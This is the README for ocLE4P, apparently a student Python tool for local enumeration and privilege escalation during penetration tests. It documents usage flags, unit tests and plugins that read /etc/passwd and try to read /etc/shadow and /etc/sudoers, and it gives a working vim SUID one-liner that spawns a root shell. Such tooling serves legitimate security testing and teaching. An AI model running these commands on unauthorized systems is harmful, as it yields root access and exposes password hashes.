# ocLE4P  
![](readme/readmeLOGO.gif)
## Table of contents  

   * [:one: Introduction:](#introduction)
   * [:two: User documentation:](#user-documentation)
      * [:hash: Setup](#setup)
      * [:hash: Usage](#usage)
   * [:three: Unit Tests:](#unit-tests)
      * [:hash: 'mdcvxiv.py' test](#mdcvxivpy-test)
   * [:four: Plugins:](#plugins)
      * [:hash: "mdcvxiv.py" plugins](#mdcvxivpy)


## Introduction:  
ocLE4P is a customizable Local Enumeration and Privilege Escalation tool based on Python. Everyone can write their own plugins by following
the template files and including the plugins into the ocLE4P.py file. The enumeration plugins in "mdcvxiv.py" also support non-interactive shells.
The non-interactive options give the user file with the output of the chosen enumeration. 
###### What is Local Enumeration? 
Local Enumeration is ordering in a list, specific assets of a system. That might be the running processes of the system, the version of the drivers,
users of the system etc. 
###### What is Privilege Escalation? 
Privilege Escalation is escalating the rights of low privilege user to one with higher rights or root.
The purpose of the project is to collect as many as possible tools for Local Enumeration and PrivEsc. That can automate the process of gathering information a system after successful penetration tasting, and it can even escalate the privilege of the user.  


## User documentation:  
The project is based on Python 3. It contains a menu, "ocLE4P.py", from which, the user can choose the plugin he/she wants to use. If the file is run with an argument "-h" or "--help", the non-interactive enumeration options, will be displayed. The non-interactive interface is contained in "mdcvxiv.py" plugin.  

### Setup  
Requirements for installation:
   - Linux, BSD OS or Windows (Tested on Arch, Kali Linux, LXDE, Windows7, Debian)
   - Python 3
   - pip3 (dev mod)
   - git (optional) 
No external libs are used, so once downloaded, the tool is ready for usage.

### Usage  
Run ```python3 ocLE4P.py``` to open the menu or ```python3 ocLE4P.py -h``` for non-interactive interface.  
The menu has two main options.
1 - Privilege Escalation
2 - Local Enumeration
Each of them will take you to a sub-menu with the relevant plugins. The menu is checking the system when it is started, so only plugins for the specific OS are displayed.
The non-interactive interface supports all enumerations plugins in "mdcvxiv.py", so they can be started without entering the menu. The output is collected into a log file.

## Unit Tests:  
### 'mdcvxiv.py' test [![tests/test_mdcvxiv_plugins.py](https://img.shields.io/badge/tests-test__mdcvxiv__plugins.py-red)](https://github.coventry.ac.uk/ivanovn/ocLEAP/blob/master/tests/test_mdcvxiv_plugins.py)  
|Function|Test|Expected result|
|---|---|---|
|fileIn()|Open log file|True|
|fileIn()|Check the functionality with simulated plugin|True|
|interactive()|Pass incorrect argument and checks for "Incorrect argument!"|True|
|interactive()|Pass two arguments and checks for "Only one argument is required!"|True|
|interactive()|Check is every available option is printed|True|
|interactive()|Open log file (insurance for correctly called function)|True|
|interactive()|Checks if the options are written|True|
|TempFile().gen()|Checks if file is generated|True|
|TempFile().rem()|Checks if file is deleted|True|

|Plugin|Test|Expected result|
|---|---|---|
|All plugins|Checks is  the plugin instance of plugins.Enumeration or plugin.PrivEsc|True|
|All plugins|Checks is  the plugin instance of plugins.Items|True|
|All plugins|Checks is "Nick" is in plug.info()|True|
|All Enumerations plugins|Checks is content len grater than 0|True|
|SysServUNIX|Is the output of "whoami" in content|True|
|SysServUNIX|Is the output of "hostnamectl" in content|True|
|SysServUNIX|Is the output of "echo $XDG_CURRENT_DESKTOP" in content|True|
|SysServUNIX|Is the output of "systemctl list-units --type=service --state=running" in content|True|
|SysServUNIX|Is the output of "systemctl list-units --type=service --all" in content|True|
|SysServUNIX|Is the output of "systemctl list-unit-files" in content|True|
|POPS_UNIX|Is the first line of "ps -eF  grep root" in content|True|
|POPS_UNIX|Is the first line of "ps -eF" in content|True|
|POPS_UNIX|Is the error message of "netstat -antup" in content|True|
|POPS_UNIX|Is the output of "cat /etc/passwd" in content|True|
|POPS_UNIX|Is the output of "grep -v /etc/passwd" in content|True|
|POPS_UNIX|Is the output of 'echo -e "$grpinfo"  grep "(adm)"' in content|True|
|POPS_UNIX|Is the output of "grep -v -E '^#' /etc/passwd  awk -F: '$3 == 0 { print $1}'" in content|True|
|POPS_UNIX|Is the error message of "grep -v -e '^$' /etc/sudoers grep -v '#'" in content|True|
|POPS_UNIX|Is the error message of "ls -ahl /root/" in content|True|
|POPS_UNIX|Is the error message of "echo ''  sudo -S -l -k" in content|True|
|SUID_check()|Is the output of SUID_check("vim") in "find / -perm -u=s -type f 2> /dev/null"|True|
|SUID_check()|Is the output of SUID_check("grep") in "find / -perm -u=s -type f 2> /dev/null"|True|
|SysServWIN|Is the output of "whoami" in content|True|
|SysServWIN|Are th first 15 lines of "systeminfo" in content|True|
|SysServWIN|Is the output of "sc queryex type= service" in content|True|
|SysServWIN|Is the output of "sc queryex type= service state= all" in content|True|
|SysServWIN|Is the output of "ls -ahl /root/" in content|True|
|SysServWIN|Is the output of "sc queryex type= driver" in content|True|


## Plugins:  
### mdcvxiv.py [![src/mdcvxiv.py](https://img.shields.io/badge/src-mdcvxiv.py-red)](https://github.coventry.ac.uk/ivanovn/ocLEAP/blob/master/src/mdcvxiv.py)  
#### <--------------ENUMERATION-------------->  
All of the enumerations plugins support the non-interactive interface.  This interface can be run on Linux and Windows. The options that are provided are:  
```shell
python3 src/ocLE4P.py --linux-enumeration
```
Execute every plugin in 'mdcvxiv.py' for Linux enumeration. Write the output in log file.  

```shell
python3 src/ocLE4P.py --linux-service-enumeration
```
Execute SysServUNIX plugin from 'mdcvxiv.py'. Plugin for local system services enumeration for Linux. Shows the current user, the host info + desktop environment, running services, all services and the unit files. Write the output in log file.  

```shell
python3 src/ocLE4P.py --linux-pops-enumeration
```
Gets root processes+ALL. Shows the status of the open ports. Reads the content of /etc/passwd and checks for any hashes in it. Search for any in and root accounts. Trying to read /etc/sudoers and /etc/shadow. Trying sudo without a password. Write the output in log file.  

```shell
python3 src/ocLE4P.py --win-enumeration
```
Execute every plugin in 'mdcvxiv.py' for Windows enumeration. Write the output in log file.  

```shell
python3 src/ocLE4P.py --win-service-enumeration
```
Execute SysServWIN plugin from 'mdcvxiv.py'. Plugin for host info and host services enumeration. Write the output in log file.  

##### SysServUNIX  
Plugin for local system services enumeration for Linux Shows the current user, the host info + desktop environment, running services, all services and the unit files.  

##### POPS_UNIX  
Gets root processes+ALL. Shows the status of the open ports. Reads the content of /etc/passwd and checks for any hashes in it. Search for any in and root accounts. Trying to read /etc/sudoers and /etc/shadow. Trying sudo without a password.  

##### SysServWIN  
Plugin for host info and host services enumeration. Print the current user, system information, running processes, all processes and the drivers of the host.  
#### <----------------PrivEsc---------------->  
##### vim_UNIX  
If vim has set SUID, the plugin tries to drop root shell by executing:
'''
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
'''
##### grepSHADOW  
If grep has set SUID, the plugin tries to read 'etc/shadow' file.  
